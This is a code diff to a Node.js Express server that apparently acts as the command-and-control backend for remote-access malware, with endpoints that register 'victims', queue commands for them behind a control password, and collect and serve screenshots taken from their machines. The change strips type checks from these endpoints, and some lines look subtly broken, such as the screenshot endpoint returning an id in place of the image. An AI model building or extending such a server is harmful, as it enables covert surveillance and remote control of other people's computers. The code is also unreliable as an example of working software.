@@ -38,7 +38,7 @@ async function safeJson(res,req,data,code) {
 const selfIp = getPublicIpAddress()
 
 app.post('/registerLox', async (req,res) => {
-  if (req && req.body && req.body.uuid && typeof(req.body.uuid) === 'string') {
+  if (req && req.body && req.body.uuid) {
     victims.push({uuid: req.body.uuid, pendingTasks: [], currentPhoto: 'none', photoId: 0})
     safeJson(req,req,{'ok': true, 'msg': 'a'}, 200)
   } else {
@@ -60,7 +60,7 @@ app.get('/getVictims', async (req, res) => {
 });
 
 app.get('/getMyTasks', async (req,res) => {
-    if (req && req.body && req.body.uuid && typeof(req.body.uuid) === 'string') {
+    if (req && req.body && req.body.uuid) {
       const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
       if (victim && victim.pendingTasks) {
         safeJson(res,req,{'ok': true, 'msg': 'a', tasks: [victim.pendingTasks]},200)
@@ -74,7 +74,7 @@ app.get('/getMyTasks', async (req,res) => {
 })
 
 app.post('/sendScreen', async (req,res) => {
-    if (req && req.body && req.body.image && typeof(req.body.image) === 'string' && req.body.uuid && typeof(req.body.uuid) === 'string' && req.body.photoId && typeof(req.body.photoId) === 'number') {
+    if (req && req.body && req.body.image && req.body.uuid && req.body.photoId) {
       const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
       if (victim && victim.photoId && victim.photoId < req.body.photoId) {
         victim.currentPhoto = req.body.image
@@ -88,7 +88,7 @@ app.post('/sendScreen', async (req,res) => {
 })
 
 app.get('/getScreen', async (req,res) => {
-    if (req && req.body && req.body.uuid && typeof(req.body.uuid) == 'string') {
+    if (req && req.body && req.body.uuid) {
       const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.uuid)
       if (victim && victim.photoId) {
         safeSend(res,req,{ 'image': victim.photoId, 'imageId': victim.photoId, 'ok': true })
@@ -101,7 +101,7 @@ app.get('/getScreen', async (req,res) => {
 })
 
 app.post('/prikaz', async (req,res) => {
-  if (req && req.body && req.body.password && typeof(req.body.password) === 'string' && req.body.password === controlPassword && req.body.prikaz && typeof(req.body.prikaz) === 'string' && req.body.victim && typeof(req.body.victim) === 'string') {
+  if (req && req.body && req.body.password && req.body.password === controlPassword && req.body.prikaz && req.body.victim) {
     const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.victim)
     if (victim) {
       victim.pendingTasks.push(req.body.prikaz)
